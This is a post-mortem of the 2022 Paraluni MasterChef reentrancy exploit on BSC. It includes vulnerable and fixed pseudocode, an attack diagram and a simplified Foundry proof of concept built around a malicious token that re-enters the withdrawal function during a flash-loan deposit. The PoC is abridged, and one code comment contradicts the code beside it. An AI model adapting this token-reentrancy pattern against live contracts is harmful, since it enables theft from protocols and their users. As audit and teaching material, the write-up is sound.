# Paraluni — Malicious Token Reentrancy LP Deposit Exploit Analysis

| Field | Details |
|------|------|
| **Date** | 2022-03-13 |
| **Protocol** | Paraluni |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$1,700,000 (USDT, BUSD) |
| **Attacker** | Attacker address unconfirmed |
| **Vulnerable Contract** | MasterChef [0x633Fa755a83B015cCcDc451F82C57EA0Bd32b4B4](https://bscscan.com/address/0x633Fa755a83B015cCcDc451F82C57EA0Bd32b4B4) |
| **Root Cause** | During `depositByAddLiquidity()`'s use of externally supplied tokens to create a Pancake LP, the malicious token's transfer hook allowed reentrancy, enabling duplicate withdrawal via `withdrawAndRemoveLiquidity()` |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-03/Paraluni_exp.sol) |

---
## 1. Vulnerability Overview

Paraluni MasterChef's `depositByAddLiquidity()` function allowed users to supply two tokens, add them to a PancakeSwap LP, and stake the resulting LP tokens.

The attacker deployed a malicious ERC20 token (`EvilToken`) with reentrancy code embedded in its `transfer()` function that calls MasterChef's `withdrawAndRemoveLiquidity()`. When the malicious token is transferred inside `depositByAddLiquidity()`, the hook fires — enabling reentrancy to withdraw existing LP before the deposit is finalized.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable MasterChef.depositByAddLiquidity() (pseudocode)
contract MasterChef {

    function depositByAddLiquidity(
        uint256 _pid,
        address[2] memory _tokens,
        uint256[2] memory _amounts
    ) external {
        // ❌ Reentrancy possible when malicious token is transferred
        // EvilToken.transfer() calls withdrawAndRemoveLiquidity()
        IERC20(_tokens[0]).transferFrom(msg.sender, address(this), _amounts[0]);
        IERC20(_tokens[1]).transferFrom(msg.sender, address(this), _amounts[1]);

        // Create LP token and stake
        _addLiquidityAndStake(_pid, _tokens, _amounts);

        // ❌ State update occurs after external call
        userInfo[_pid][msg.sender].amount += lpAmount;
    }

    // ❌ withdrawAndRemoveLiquidity also lacks reentrancy guard
    function withdrawAndRemoveLiquidity(uint256 _pid, uint256 _amount) external {
        UserInfo storage user = userInfo[_pid][msg.sender];
        require(user.amount >= _amount, "withdraw: not good");
        // Withdraw LP without deducting balance first
        user.amount -= _amount;
        _removeLiquidityAndTransfer(_pid, _amount, msg.sender);
    }
}

// ✅ Correct pattern
contract MasterChefFixed {
    bool private locked;

    modifier nonReentrant() {
        require(!locked);
        locked = true;
        _;
        locked = false;
    }

    function depositByAddLiquidity(...) external nonReentrant {
        // ✅ CEI: update state first
        userInfo[_pid][msg.sender].amount += lpAmount; // expected LP amount
        // external calls after
        IERC20(_tokens[0]).transferFrom(msg.sender, address(this), _amounts[0]);
        // ...
    }
}
```

---
### On-Chain Source Code

Source: Bytecode decompilation


**Paraluni_decompiled.sol** — Related contract (vulnerable function Facet not included):
```solidity
// ❌ Root cause: During `depositByAddLiquidity()`'s use of externally supplied tokens to create a Pancake LP, the malicious token's transfer hook allows reentrancy enabling `withdra
// ⚠️ Source for vulnerable function `depositByAddLiquidity()` is not in this file
// (Located in a Diamond pattern Facet or proxy implementation)
// SPDX-License-Identifier: UNLICENSED
// Source unverified — reverse-engineered from bytecode
// Original: 0x633Fa755a83B015cCcDc451F82C57EA0Bd32b4B4 (BSC)
// Reverse-engineering method: function selector extraction + 4byte.directory decoding

pragma solidity ^0.8.0;

contract Paraluni_Decompiled {
    // Function execution
    function _acceptAdmin() external view returns (uint256) {}  // 0xe9c714f2

    // Function execution
    function _acceptImplementation() external view returns (uint256) {}  // 0xc1e80334

    // Pool configuration
    function _setPendingAdmin(address arg0) external view returns (uint256) {}  // 0xb71d1a0c

    // Pool configuration
    function _setPendingImplementation(address arg0) external view returns (uint256) {}  // 0xe992a041

```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Deploy EvilToken (with reentrancy code inside transfer)
    │
    ├─[2] Flash loan: borrow 10,000 USDT and 10,000 BUSD
    │       pair.swap(10_000e18, 10_000e18, ...)
    │
    ├─[3] [Flash loan callback]
    │       Instantiate EvilToken(token0), EvilToken(token1)
    │
    ├─[4] Call MasterChef.depositByAddLiquidity()
    │       _tokens = [EvilToken, existing_LP]
    │       _amounts = [...]
    │       ↓
    │   EvilToken.transferFrom() executes
    │       ↓ Hook fires inside EvilToken.transfer()
    │           │
    │           └─ [Reentrancy] MasterChef.withdrawAndRemoveLiquidity()
    │                   Withdraw attacker's existing LP (before balance deduction)
    │                   Receive USDT/BUSD
    │
    ├─[5] withdrawChange() → withdraw additional tokens
    │
    ├─[6] token1.redeem() → recover remaining assets
    │
    └─[7] Repay flash loan + transfer profit
            Loss: ~$1,700,000
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface IMasterChef {
    function depositByAddLiquidity(
        uint256 pid,
        address[2] memory tokens,
        uint256[2] memory amounts
    ) external;
    function withdrawAndRemoveLiquidity(uint256 pid, uint256 amount) external;
    function withdrawChange(uint256 pid) external;
}

// ⚡ Malicious token: contains reentrancy code inside transfer
contract EvilToken {
    IMasterChef masterChef;
    uint256 pid;
    bool attacking = false;

    constructor(address _masterChef, uint256 _pid) {
        masterChef = IMasterChef(_masterChef);
        pid = _pid;
    }

    function transfer(address, uint256) external returns (bool) {
        if (!attacking) {
            attacking = true;
            // ⚡ Reentrancy: call withdraw while depositByAddLiquidity is executing
            masterChef.withdrawAndRemoveLiquidity(pid, existingAmount);
            attacking = false;
        }
        return true;
    }

    function transferFrom(address, address, uint256) external returns (bool) {
        return this.transfer(address(0), 0);
    }

    function balanceOf(address) external view returns (uint256) { return 0; }
    function approve(address, uint256) external returns (bool) { return true; }
    function allowance(address, address) external view returns (uint256) { return type(uint256).max; }

    uint256 existingAmount = 0;
    function redeem() external {
        // Recover remaining assets
    }
}

contract ContractTest is Test {
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IMasterChef masterChef = IMasterChef(0x633Fa755a83B015cCcDc451F82C57EA0Bd32b4B4);
    address pancakePair = 0x7EFaEf62fDdCCa950418312c6C91Aef321375A00;

    function setUp() public {
        vm.createSelectFork("bsc", 16_008_280);
    }

    function testExploit() public {
        // [Step 1] Deploy two malicious tokens
        EvilToken token0 = new EvilToken(address(masterChef), 0);
        EvilToken token1 = new EvilToken(address(masterChef), 0);

        // [Step 2] Initiate flash loan
        IPancakePair(pancakePair).swap(10_000e18, 10_000e18, address(this), "0x");
    }

    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        // [Step 3] Call depositByAddLiquidity with malicious tokens
        EvilToken token0 = new EvilToken(address(masterChef), 0);
        EvilToken token1 = new EvilToken(address(masterChef), 0);

        address[2] memory tokens = [address(token0), address(token1)];
        uint256[2] memory amounts = [uint256(1e18), uint256(1e18)];

        // ⚡ During this call: token0.transfer() → reentrancy triggered
        masterChef.depositByAddLiquidity(0, tokens, amounts);

        // [Step 4] Additional withdrawal
        masterChef.withdrawChange(0);

        // [Step 5] Repay flash loan
        uint256 fee = 10_000e18 * 3 / 997 + 1;
        USDT.transfer(pancakePair, 10_000e18 + fee);
        BUSD.transfer(pancakePair, 10_000e18 + fee);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Reentrancy Attack (Reentrancy via Malicious Token) |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **OWASP DeFi** | Malicious Token Callback Reentrancy |
| **Attack Vector** | EvilToken.transfer() → withdrawAndRemoveLiquidity() reentrancy |
| **Preconditions** | MasterChef accepts arbitrary tokens and lacks nonReentrant guard |
| **Impact** | Total drain of protocol's USDT/BUSD |

---
## 6. Remediation Recommendations

1. **Token Whitelist**: Restrict supported tokens to a predefined whitelist to prevent malicious token injection.
2. **Global ReentrancyGuard**: Apply `nonReentrant` to all deposit/withdrawal functions.
3. **CEI Pattern**: Complete state variable (user.amount) updates before any external calls.
4. **Audit All External Token Acceptance Paths**: Strictly audit every path through which users can supply arbitrary tokens to the protocol.

---
## 7. Lessons Learned

- **Malicious Token Pattern**: The pattern of injecting attacker-crafted tokens into a protocol appears repeatedly in MasterChef-based protocols.
- **BSC Characteristics**: BSC's low fees make it trivially easy to deploy malicious contracts, making this type of attack more frequent.
- **$1.7M Loss**: An attack that could have been prevented with a single whitelist check.